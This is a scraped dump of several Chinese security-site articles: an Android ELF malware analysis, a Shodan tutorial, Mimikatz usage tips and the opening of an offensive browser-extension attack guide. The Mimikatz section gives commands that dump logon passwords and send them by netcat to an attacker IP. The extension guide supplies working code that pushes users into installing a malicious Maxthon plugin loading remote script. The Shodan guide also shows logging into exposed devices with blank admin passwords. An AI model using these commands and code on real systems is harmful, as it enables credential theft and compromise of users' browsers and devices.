候都已经在黑市被卖了多少遍了，然后到所谓的社工论坛出卖，最后企业发现自己的数据已经泄露的时候已经无法挽回了。互联网那么大，只要公开一份就会有数以千万记的复制版本。例如之前的QQ群泄露，还有开房数据，尽管网警怎么去禁止这些网站，总有方法做出镜像，总有人早已下载好到本地查询。拿几个网站做例子：不过在zf的严打下，还是消减了好多这样的网站，但是总有一些还存在，有些是注册在国外的服务器，很难追查到。还有些是管理层的漏洞，把用户的数据公开在外，导致数据泄露，不过最大的原因还是安全漏洞和黑客攻击。某云的镜像查询到：数据量非常大。八、我们能做什么？我们能做的其实很少，但是还是要必须做，比如所有网站的密码不能统一，能不填真名和身份证的地方就不填。不要信任第三方的网站等等，最主要还是在企业要管理好自己的网站，发现漏洞及时响应处理，发现数据泄露及时报警，这样才能把损失降到最低。只有企业和用户一起努力，才能做到互联网的安全。","2016-11-08 16:57:51","网络安全","浅谈大数据应用的隐私保护","http://nsoad.com/Article/Network-security/20161108/719.html"
"5ccbfb524f2f0a0a7a69c148","自 2010 年开始，全球进入了移动互联网时代，作为主流移动操作系统Android也得到了迅猛发展。Android病毒也从简单到复杂，从单纯的dex病毒转向为elf病毒（其中elf是Linux下的可执行程序）。这一发展趋势有","silence","ELF病毒背景1.Android病毒发展趋势自 2010 年开始，全球进入了移动互联网时代，作为主流移动操作系统Android也得到了迅猛发展。Android病毒也从简单到复杂，从单纯的dex病毒转向为elf病毒（其中elf是Linux下的可执行程序）。这一发展趋势有几个原因：经过多年发展程序编写人员水平普遍提高，大量的linux程序移植到android系统，病毒也随之发展。android系统碎片化严重，提取漏洞不断累积导致病毒攻击方式多元化 ，elf文件具有比dex程序更难分析的特点。常规杀软没有root权限，难以查杀病毒。2.ELF病毒纪元图感染情况：root类病毒自2014年9月至2016年7月份的感染量主要两大家族感染量     3.感染用户案例下面是Facebook上用户感染ELF病毒的案例，可以看出，由于没有ROOT权限，无法直接清除病毒。ELF病毒危害形式1.提权利用漏洞获取ROOT权限,如病毒rootnik：病毒获取ROOT 权限时，运行/data/local/tmp/下的Matrix（ROOT组件，命令：./Matrix /data/local/tmp 1），病毒程序Matrix从fileWork中解密并释放支持文件，调用脚本wsroot.sh进行ROOT。脚本wsroot.sh 运行时传入参数/data/local/tmp、1，其中/data/local/tmp为支持文件路径，1代表不安装superuser，提权文件为su8。ROOT后在系统目录下添加提权应用 在/system/bin/下生成文件su8，作为提权的su程序，该程序可以被任何App用来获取ROOT权限使用，存在巨大隐患。        文件列表（都为提供ROOT 权限服务）：/system/xbin/su8/system/xbin/sugote/system/xbin/supolicy/system/xbin/daemonsu2.对抗伪装替换系统服务病毒将系统启动时init.rc内要启动的服务替换成病毒服务，并在病毒服务启动后再调用原始服务。  如木马Android.Troj.at_Seed.a，会将自身的主要模块拷贝到系统目录/system/bin内，伪装成系统服务debuggerd（该服务可以侦测到程序崩溃，并将崩溃时的进程状态信息输出到文件和串口中，以供开发人员分析调试使用。），并将原系统服务debuggerd改名为debuggerd_real，这一方式在ROOT工具中也有使用，下图是使用kingroot对手机进行ROOT后，/system/bin/debuggerd文件尾内容： 病毒不止利用debuggerd服务，有的病毒会利用/system/bin/vold服务，如地狱火，一样的手段，一样的效果。（vold服务：Volume Daemon存储类的守护进程，作为Android的一个本地服务，负责处理诸如SD、USB等存储类设备的插拔等事件。）感染boot.img通过修改boot.img分区并刷回的方式感染/sbin，修改init.rc文件，达到每次开机自启的目的。          由于/sbin目录和init.rc文件位于一个RAM disk中，该RAM disk是一个只读的、位于内存中的文件系统，从设备磁盘的boot分区加载而来，所有的更改都不会写回磁盘，每次都是直接从分区中读取，所以无法通过remount，删除来清除病毒。需要刷回boot.img来清除病毒，增大清除难度。如病毒oldbot、地狱火。创建守护进程创建守护进程，时刻监控自身进程或文件，当进程被结束或者并文件被删除时及时启动进程或恢复病毒文件。如：病毒ghostpush，舞毒蛾。修改病毒隐藏权限病毒给衍生文件和apk包设置隐藏属性（+i），使其无法被删除，无法被卸载。linux文件系统可以设置文件隐藏属性，如下图：将文件的属性设置为 +i 属性则可以使文件不被删除。如ghostpush病毒等，将自身elf文件设置成+i属性。3.云控由于android系统的碎片化，各子系统的ROOT模式，控制方案有显著不同，使病毒大量采取云端控制的方案，使用云控的方式可以根据不同的子系统下载不同的ROOT方案，使用不同的控制指令，大大减少代码量，使得病毒更加灵活、可控。通过云控获取ROOT方案病毒通过上传感染机器的实际环境，获取相对应的ROOT方案，如danpay家族的client病毒。client下载加密的ROOT提权工具压缩包并根据不同的手机设备下载对应的ROOT工具下载地址和方案：http://abcll0.us:9009/gamesdk/doroot.jsphttp://my2014.us:9009/gamesdk/advert.jsp4.注入通过elf注入系统进程，修改程序执行或窃取内部信息。注入浏览器进行流量劫持注入浏览器进程，劫持特定网站，可以做诈骗，钓鱼等非法活动，如病毒Android.TROJ.triada.mc通过elf文件rinject将病毒的so文件注入到浏览器进程，将系统的loadUrl函数注册为静态函数的方式进行hook，使得浏览器在访问特定网站时被劫持。ringect注入器（通过ptrace）：          将病毒so文件/system/lib/libremeth.so注入到浏览器进程中：通过hook android.webkit.WebView类的loadUrl函数实现劫持：正常访问网络流程：木马劫持后访问网络流程：注入社交应用获取聊天记录病毒注入“手机QQ”、“微信”社交应用，获取聊天记录并上传远端服务器， 通过inject将病毒so文件注入到“手机QQ”或“微信”的进程中，获取其控制权，并在so中动态加载病毒的dex文件以便窃取聊天内容，并上传。ELF病毒所在目录1.所在目录/system/bin系统内可执行文件所在路径，内存在大量系统服务，在系统PATH内。/system/xbin系统内可执行文件所在路径，在系统PATH内。/sbinAndroid系统只读分区，里面存放了几个重要守护进程的二进制文件，通过更新boot.img可将病毒刷到此目录。/system/etc/Linux系统的目录，存放配置文件。/system/usr用户文件夹，包含共享、键盘布局、时间区域文件等。/data/local/tmp/data目录中的可以提权目录，一般用来运行可执行文件2.目录特点目录占比图：除了/data/local/tmp/目录外都需要ROOT权限1)ELF病毒绝大多数都具有ROOT权限。2)病毒运行后首要的行为是获取ROOT权限。/system/bin、/system/xbin目录占绝大多数1)这两个目录是path路径方便ROOT提权。2)bin目录方便伪装成系统服务。ELF病毒ROOT（提权）方案1.分类按照方案获取分为云端获取和本地释放两种。按照ROOT程序分为特定漏洞提权和ROOT工具提权2.ROOT工具简述PingPongRoot：是由国内安全大牛Keen Team团队开发出来的主要针对三星S6的ROOT工具，主要利用CVE-2015-3636漏洞。能ROOT大量Android 5.1及其以下的系统。TowelRoot：是美国知名黑客Geohot开发出来的一款ROOT工具，号称可以Root所有2014年6月3日之前的Android设备，利用漏洞CVE-2014-3153。Mtkfb：该工具由ele7enxxh根据[email protected]/*  */的报告以及网上的提权代码整理。该工具利用了mtkfb_ioctl函数越界写内存提权漏洞。FramaRoot：是由XDA论坛用 “Alephzain“发布的一款一键ROOT工具，针对设备版本较低，利用了Boromir, Barahir, Frodo, Legolas, Aragorn, Gandalf, Pippin 和 Farahir漏洞（mmap边界检查漏洞） 。Root助手： 深圳市网卓信息科技有限公司开发的一款ROOT软件，整合大量漏洞，提供一键ROOT功能，被病毒利用。ELF病毒对传统杀软的挑战1.权限大量ELF病毒都是主动利用漏洞对中毒手机进行ROOT，大量病毒还会删除原有ROOT管理程序，使得其他应用无法使用ROOT权限。安全软件需要在已经获取ROOT权限的手机上申请ROOT权限，这就导致杀软获取ROOT权限的数量比ELF病毒获取ROOT权限的数量少很多，处于被动。2.残留普通杀软在处理Android病毒时，一般的手段是直接卸载，对于system的应用引导用户进行停用，这样的处理无法满足对ELF病毒的处理（elf进程将备份的病毒还原或启动）。残留的ROOT后门，可以被其他病毒直接使用。1)案例：用病毒残留的后门文件PPM将sdcard目录下的apk程序拷贝到/system/app/目录，当手机重启后达到安装app的目的。2,案例：运行病毒残留/system/bin/.alpha 直接获得ROOT权限 近两个月（20160524-20150726）残留的root后门（elf文件）3.针对性普通杀软难于针对性的对不同危害的ELF进行处理。专杀的解决方案加强引导，在用户授权的情况下，积极获取ROOT权限，使专杀和病毒处于同一起跑线。采用模块化架构，可以针对不同危害采取不同的模块进行查杀、修复。由于权限的提高可以完全将残留的ELF文件删除。木马专杀下载地址：http://cn.cmcm.com/activity/push/cm/stk/1/查杀效果* 本文作者：猎豹移动安全实验室，转载请注明来自FreeBuf.COM","2016-09-16 16:03:15","系统安全","安卓ELF恶意软件深度分析","http://nsoad.com/Article/system/20160916/401.html"
"5ccbfb524f2f0a0a7a69c149","那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录","kong","什么是 Shodan？首先，Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器。基本用法这里就像是用 Google 一样，在主页的搜索框中输入想要搜索的内容即可，例如下面我搜索 “SSH”：上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：Results map – 搜索结果展示地图Top services (Ports) – 使用最多的服务/端口Top organizations (ISPs) – 使用最多的组织/ISPTop operating systems – 使用最多的操作系统Top products (Software name) – 使用最多的产品/软件名称随后，在中间的主页面我们可以看到包含如下的搜索结果：IP 地址主机名ISP该条目的收录收录时间该主机位于的国家Banner 信息想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。此时，URL 会变成这种格式 https://www.shodan.io/host/[IP]，所以我们也可以通过直接访问指定的 IP 来查看详细信息。上图中我们可以从顶部在地图中看到主机的物理地址，从左侧了解到主机的相关信息，右侧则包含目标主机的端口列表及其详细信息。使用搜索过滤如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤，常见用的过滤命令如下所示：hostname：搜索指定的主机或域名，例如 hostname:""google""port：搜索指定的端口或服务，例如 port:""21""country：搜索指定的国家，例如 country:""CN""city：搜索指定的城市，例如 city:""Hefei""org：搜索指定的组织或公司，例如 org:""google""isp：搜索指定的ISP供应商，例如 isp:""China Telecom""product：搜索指定的操作系统/软件/平台，例如 product:""Apache httpd""version：搜索指定的软件版本，例如 version:""1.6.2""geo：搜索指定的地理位置，参数为经纬度，例如 geo:""31.8639, 117.2808""before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:""11-11-15""net：搜索指定的IP地址或子网，例如 net:""210.45.240.0/24""搜索实例查找位于合肥的 Apache 服务器：apache city:""Hefei""查找位于国内的 Nginx 服务器：nginx country:""CN""查找 GWS(Google Web Server) 服务器：""Server: gws"" hostname:""google""查找指定网段的华为设备：huawei net:""61.191.146.0/24""如上通过在基本关键字后增加指定的过滤关键字，能快速的帮助发现我们感兴趣的内容。当然，还有更快速更有意思的方法，那就是点击 Shodan 搜索栏右侧的 “Explore” 按钮，就会得到很多别人分享的搜索语法，你问我别人分享的语法有什么好玩的？那咱们就随便来看看吧：咱们随便选取一个名为“NetSureveillance Web”的用户分享语法，从下面的描述信息我们基本就能得知这就是一个弱密码的漏洞，为了方便测试让我们把语法在增加一个国家的过滤信息，最终语法如下：Server: uc-httpd 1.0.0 200 OK Country:""CN""现在让我们随便选取一个页面进去输入，使用admin账号和空密码就能顺利进入了：）其他功能Shodan 不仅可以查找网络设备，它还具有其他相当不错的功能。Exploits：每次查询完后，点击页面上的 “Exploits” 按钮，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：https://exploits.shodan.io/welcome；地图：每次查询完后，点击页面上的 “Maps” 按钮，Shodan 会将查询结果可视化的展示在地图当中；报表：每次查询完后，点击页面上的 “Create Report” 按钮，Shodan 就会帮我们生成一份精美的报表，这是天天要写文档兄弟的一大好帮手啊；命令行下使用 ShodanShodan 是由官方提供的 Python 库的，项目位于：https://github.com/achillean/shodan-python安装pip install shodan或者git clone https://github.com/achillean/shodan-python.git &amp;&amp; cd shodan-pythonpython setup.py install安装完后我们先看下帮助信息：➜  ~ shodan -hUsage: shodan [OPTIONS] COMMAND [ARGS]...Options:  -h, --help  Show this message and exit.Commands:  alert       Manage the network alerts for your account  # 管理账户的网络提示  convert     Convert the given input data file into a...  # 转换输入文件  count       Returns the number of results for a search  # 返回查询结果数量  download    Download search results and save them in a...  # 下载查询结果到文件  honeyscore  Check whether the IP is a honeypot or not.  # 检查 IP 是否为蜜罐  host        View all available information for an IP...  # 显示一个 IP 所有可用的详细信息  info        Shows general information about your account  # 显示账户的一般信息  init        Initialize the Shodan command-line  # 初始化命令行  myip        Print your external IP address  # 输出用户当前公网IP  parse       Extract information out of compressed JSON...  # 解析提取压缩的JSON信息，即使用download下载的数据  scan        Scan an IP/ netblock using Shodan.  # 使用 Shodan 扫描一个IP或者网段  search      Search the Shodan database  # 查询 Shodan 数据库  stats       Provide summary information about a search...  # 提供搜索结果的概要信息  stream      Stream data in real-time.  # 实时显示流数据常用示例init初始化命令行工具。➜  ~ shodan init [API_Key]Successfully initializedcount 返回查询的结果数量。➜  ~ shodan count microsoft iis 6.0575862download 将搜索结果下载到一个文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载1000条结果，如果想下载更多结果需要增加 --limit 参数。parse我们可以使用 parse 来解析之前下载数据，它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，当然更可以用作传递给其他处理脚本的管道。例如，我们想将上面下载的数据以CSV格式输出IP地址、端口号和组织名称：➜  ~ shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gzhost查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。search直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据。当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：➜  ~ shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0代码中使用 Shodan 库还是使用上一节讲到的 shodan 库，安装方式这里不在阐述了。同样的，在使用 shodan 库之前需要初始化连接 API，代码如下：import shodanSHODAN_API_KEY = ""API_Key""api = shodan.Shodan(SHODAN_API_KEY)随后，我们就可以搜索数据了，示例代码片如下：try:    # 搜索 Shodan    results = api.search('apache')    # 显示结果    print 'Results found: %s' % results['total']    for result in results['matches']:            print result['ip_str']except shodan.APIError, e:    print 'Error: %s' % e这里 Shodan.search() 会返回类似如下格式的 JSON 数据：{        'total': 8669969,        'matches': [                {                        'data': 'HTTP/1.0 200 OK\r\nDate: Mon, 08 Nov 2010 05:09:59 GMT\r\nSer...',                        'hostnames': ['pl4t1n.de'],                        'ip': 3579573318,                        'ip_str': '89.110.147.239',                        'os': 'FreeBSD 4.4',                        'port': 80,                        'timestamp': '2014-01-15T05:49:56.283713'                },                ...        ]}常用 Shodan 库函数shodan.Shodan(key) ：初始化连接APIShodan.count(query, facets=None)：返回查询结果数量Shodan.host(ip, history=False)：返回一个IP的详细信息Shodan.ports()：返回Shodan可查询的端口号Shodan.protocols()：返回Shodan可查询的协议Shodan.services()：返回Shodan可查询的服务Shodan.queries(page=1, sort='timestamp', order='desc')：查询其他用户分享的查询规则Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据至此，本文基本告于段落，买了 Shodan Membership 的各位朋友们可以好好的去 Happy 啦。","2016-12-05 16:59:23","安全工具","Shodan新手入坑指南","http://nsoad.com/Security-tools/20161205/tools-885.html"
"5ccbfb524f2f0a0a7a69c14a","Mimikatz 使用小技巧","silence","1.记录 Mimikatz输出：C:\&gt;mimikatz.exe """"privilege::debug"""" """"log sekurlsa::logonpasswords full"""" exit &amp;&amp; dir2.将输出导入到本地文件：C:\&gt;mimikatz.exe """"privilege::debug"""" """"sekurlsa::logonpasswords full"""" exit &gt;&gt; log.txt3.将输出传输到远程机器：Attacker执行:E:\&gt;nc -lvp 4444Victim执行:C:\&gt;mimikatz.exe """"privilege::debug"""" """"sekurlsa::logonpasswords full"""" exit | nc.exe -vv 192.168.52.1 4444192.168.52.1 为Attacker IP4.通过nc远程执行Mimikatz：Victim执行:C:\&gt;nc -lvp 443Attacker执行:E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe192.168.52.128 为Victim IP若管理员有每过几天就改密码的习惯，但是mimikatz抓取到的密码都是老密码用QuarksPwDump等抓的hash也是老hash，新密码却抓不到的情况下可以使用以下方法尝试解决privilege::debugmisc::memssp记录的结果在c:\windows\system32\mimilsa.log每次验证都会记录  如 锁屏 等  重启失效出现如上问题是因为管理一直没注销过，都是直接断开连接，lsass进程里面还吃存放的老的。也可以直接logoff，但是这样会很明显。文件mimikatz.exe、sekurlsa.dll、PsExec.exe(3389)本机终端绝对路径\mimikatz.exeprivilege::debuginject::process lsass.exe ""绝对路径\sekurlsa.dll""@getLogonPasswordsexitwebshell绝对路径\mimikatz.exe &lt; 绝对路径\c.txt &gt; 绝对路径\userpass.txt———-c.txt———-privilege::debuginject::process lsass.exe ""绝对路径\sekurlsa.dll""@getLogonPasswordsexit————————-远程终端psexec.exe -s cmd.exe绝对路径\mimikatz.exeprivilege::debuginject::process lsass.exe ""绝对路径\sekurlsa.dll""@getLogonPasswordsexit","2016-10-11 15:00:44","系统安全","Mimikatz 使用小技巧","http://nsoad.com/Article/system/20161011/522.html"
"5ccbfb524f2f0a0a7a69c14b","0x04 通用防注入系统getshe","Kong","0×0 前言：我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。0×1 让自己变成攻击者：我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装基于社工库控制插件作者的账户，加入后门代码，更新插件控制插件里调用的第三方javascript代码现在有四种方法供我们选择，我们一个个来进行介绍。0×1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”这个方法类似于之前的问题强迫安装恶意Chrome扩展 攻击者使用激进方式。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。0×1.1.1 检测是否安装了某插件我们先把这个攻击方式的代码目录架构进行说明：网站页面:index.html插件目录:icons/              插件的logo存放目录icons/icons.svg     插件logo文件def.json            插件的主控制文件，里面存着整个插件的配置代码如下:[    {        ""type"": ""extension"",        ""frameworkVersion"":""1.0.0"",        ""version"":""1.0.0"",        ""guid"": ""{7c321680-7673-484c-bcc4-de10f453cb8e}"",        ""name"": ""plug_setup"",        ""author"": ""Black-Hole"",        ""svg_icon"":""icon.svg"",        ""title"": {            ""zh-cn"": ""欺骗用户安装插件""        },        ""description"":{            ""zh-cn"":""欺骗用户安装插件""        },        ""main"":""index.html"",        ""actions"": [            {                ""type"": ""script"",                ""entryPoints"": [                    ""doc_onload""                ],                ""js"": [                    ""base.js""                ],        ""include"": [""*""],        ""includeFrames"": true             }        ]    }]base.js             每打开一个页面，要执行的JavaScript代码代码如下:后文会提到我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {    if(request.act == 'ping'){        sendResponse({""act"": ""tong""});    }})chrome.runtime.sendMessage(""extensionId"", {""act"": ""ping""}, function(response){    if(response &amp;&amp; response.act == 'tong'){        console.log('已安装');    }else{        console.log('未安装');    }});既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。首先在插件里的base.js文件里写入:var script = document.createElement('script');script.src = ""http://119.29.58.242/control.js"";document.body.appendChild(script);上面，这段代码将会在每个页面里的body标签后面写入&lt;script src=""[http://119.29.58.242/control.js](http://119.29.58.242/control.js)""&gt;&lt;/script&gt;代码，而在[http://119.29.58.242/control.js](http://119.29.58.242/control.js)文件里的代码为:window.plug_setup = function(){}这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。然后我们再在网站的页面里写：setTimeout(function(){    if(typeof(plug_setup)!=""function""){        alret(""因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"");    }},1000)因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行if(typeof(plug_setup)!=""function""){    alret(""因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面"");}这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。0×1.1.2 欺骗用户进行半自动安装指定插件我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件：我这里进行一些优化，代码如下：var ERRORTEXT = '非傲游浏览器或版本过低。&lt;a href=""http://www.maxthon.cn"" target=""_blank""&gt;点此获取最新版本傲游浏览器&lt;/a&gt;'function getInstallMessage(that, messagePack, type) {    if (external.mxCall) {        var packMxAttr = $(that).closest(messagePack);        if (type === 'skin') {            // 浏览器框架版本号            var frameVersion = external.mxCall('GetSkinFxVersion');        }        else if (type === 'app') {            // 浏览器框架版本号            var frameVersion = external.mxCall('GetAppFxVersion');            // 下个版本上了就删掉--            if (frameVersion === '1.0.0') {                frameVersion = '1.0.1';            }            // --下个版本上了就删掉        }        // 插件包框架版本号        var packMxVersion = packMxAttr.attr('file_def');        // 插件包url        var packUrl = packMxAttr.attr('file_url');        // 插件id        var packId = packMxAttr.attr('file_id');        installPack(frameVersion, packMxVersion, packUrl, type, packId);    }    else {        resultPop.show('浏览器不符', ERRORTEXT, '确定');    }}function installPack(frameVersion, packMxVersion, packUrl, type, packId) {    var isInstall = returnIsInstall(frameVersion, packMxVersion);    if (isInstall !== -1) {        if (type === 'skin') {            external.mxCall('InstallSkin', packUrl);        }        else if (type === 'app') {            external.mxCall('InstallApp', packUrl);        }        getUser(packId);    }    else {        resultPop.show('浏览器不符', ERRORTEXT, '确定');    }}function returnIsInstall(frameVersion, packMxVersion) {    var fvItem;    var pvItem;    var frameVersion = getVersionArr(frameVersion);    var packMxVersion = getVersionArr(packMxVersion);    // 定义增长索引值.    var i = 0;    while (1) {        fvItem = frameVersion[i];        pvItem = packMxVersion[i];        if (fvItem == null &amp;&amp; pvItem == null) {            return 0;        }        if (fvItem == null) {            return -1;        }        if (pvItem == null) {            return 1;        }        if (fvItem != pvItem) {            var value = fvItem &gt; pvItem ? 1 : -1            return value;        }        i++;    }}function getVersionArr(version) {    var versionArr = version.split('.');    for (var i = 0; i &lt; versionArr.length; i++) {        versionArr[i] = parseInt(versionArr[i], 10);    };    return versionArr;}function getUser(id) {    $.ajax({        type: 'GET',        url: 'http://extension.maxthon.cn/common/ajax.php?id=' + id,        data: 'data',        dataType: 'json',        success: function (data) {},        error: function () {}    });}$(document).delegate('#app-install', 'click', function (event) {    event.preventDefault();    event.stopPropagation();    getInstallMessage(this, 'a[file_def]', 'app');});详情可以在http://extension.maxthon.cn/js/temp.js里第1256行到1600行查看原始代码。此处的代码里的入口处就在$(document).delegate('#app-install', 'click', function (event) {    event.preventDefault();    event.stopPropagation();    getInstallMessage(this, 'a[file_def]', 'app');});当点击id为app-install的DOM时，会先调用getInstallMessage函数，getInstallMessage函数里再调用installPack函数，installPack函数调用returnIsInstall函数和getUser函数，returnIsInstall函数调用了getVersionArr函数。最核心的代码在installPack函数里的external.mxCall('InstallApp', packUrl);，但是无法直接调用，不然无法安装。而且这里的packUrl必须是[http://extension.maxthon.cn](http://extension.maxthon.cn)下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。上面说到当点击id为app-install的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：&lt;a id=""app-install"" style=""display:none;"" file_def=""1.0.1"" file_url=""[http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon](http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon)"" file_id=""&lt;?echo $view_id;?&gt;""&gt;安装&lt;/a&gt;，这里的file_id为&lt;?echo $view_id;?&gt;估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加$(""#app-install"").click();代码，让他自动触发完整的网站代码如下：&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=""utf-8""&gt;    &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""&gt;    &lt;title&gt;欺骗用户安装插件&lt;/title&gt;    &lt;script src=""//cdn.bootcss.com/jquery/3.1.1/jquery.min.js""&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    欺骗用户安装插件demo1    &lt;a id=""app-install"" style=""display:none;"" file_def=""1.0.1"" file_url=""http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon"" file_id=""&lt;?echo $view_id;?&gt;""&gt;安装&lt;/a&gt;&lt;/body&gt;&lt;script src=""//cdn.bootcss.com/jquery/3.1.1/jquery.min.js""&gt;&lt;/script&gt;&lt;script&gt;    setTimeout(function(){        if(typeof(plug_setup)!=""function""){            alert(""因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面"");            var ERRORTEXT = '非傲游浏览器或版本过低。&lt;a href=""http://www.maxthon.cn"" target=""_blank""&gt;点此获取最新版本傲游浏览器&lt;/a&gt;'            function getInstallMessage(that, messagePack, type) {                if (external.mxCall) {                    var packMxAttr = $(that).closest(messagePack);                    if (type === 'skin') {                        // 浏览器框架版本号                        var frameVersion = external.mxCall('GetSkinFxVersion');                    }                    else if (type === 'app') {                        // 浏览器框架版本号                        var frameVersion = external.mxCall('GetAppFxVersion');                        // 下个版本上了就删掉--                        if (frameVersion === '1.0.0') {                            frameVersion = '1.0.1';                        }                        // --下个版本上了就删掉                    }                    // 插件包框架版本号                    var packMxVersion = packMxAttr.attr('file_def');                    // 插件包url                    var packUrl = packMxAttr.attr('file_url');                    // 插件id                    var packId = packMxAttr.attr('file_id');                    console.log(frameVersion, packMxVersion, packUrl, type, packId)                    installPack(frameVersion, packMxVersion, packUrl, type, packId);                }                else {                    resultPop.show('浏览器不符', ERRORTEXT, '确定');                }            }            function installPack(frameVersion, packMxVersion, packUrl, type, packId) {                var isInstall = returnIsInstall(frameVersion, packMxVersion);                if (isInstall !== -1) {                    if (type === 'skin') {                        external.mxCall('InstallSkin', packUrl);                    }                    else if (type === 'app') {                        external.mxCall('InstallApp', packUrl);                    }                    getUser(packId);                }                else {                    resultPop.show('浏览器不符', ERRORTEXT, '确定');                }            }            function returnIsInstall(frameVersion, packMxVersion) {                var fvItem;                var pvItem;                var frameVersion = getVersionArr(frameVersion);                var packMxVersion = getVersionArr(packMxVersion);                // 定义增长索引值.                var i = 0;                while (1) {                    fvItem = frameVersion[i];                    pvItem = packMxVersion[i];                    if (fvItem == null &amp;&amp; pvItem == null) {                        return 0;                    }                    if (fvItem == null) {                        return -1;                    }                    if (pvItem == null) {                        return 1;                    }                    if (fvItem != pvItem) {                        var value = fvItem &gt; pvItem ? 1 : -1                        return value;                    }                    i++;                }            }            function getVersionArr(version) {                var versionArr = version.split('.');                for (var i = 0; i &lt; versionArr.length; i++) {                    versionArr[i] = parseInt(versionArr[i], 10);                };                return versionArr;            }            function getUser(id) {                $.ajax({                    type: 'GET',                    url: 'http://extension.maxthon.cn/common/ajax.php?id=' + id,                    data: 'data',                    dataType: 'json',                    success: function (data) {},                    error: function () {}                });            }            $(document).delegate('#app-install', 'click', function (event) {                event.preventDefault();                event.stopPropagation();                getInstallMessage(this, 'a[file_def]', 'app');            });            $(""#app-install"").click();        }    },1000);&lt;/script&gt;&lt;/html&gt;打开后的样子: 这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式0×1.2 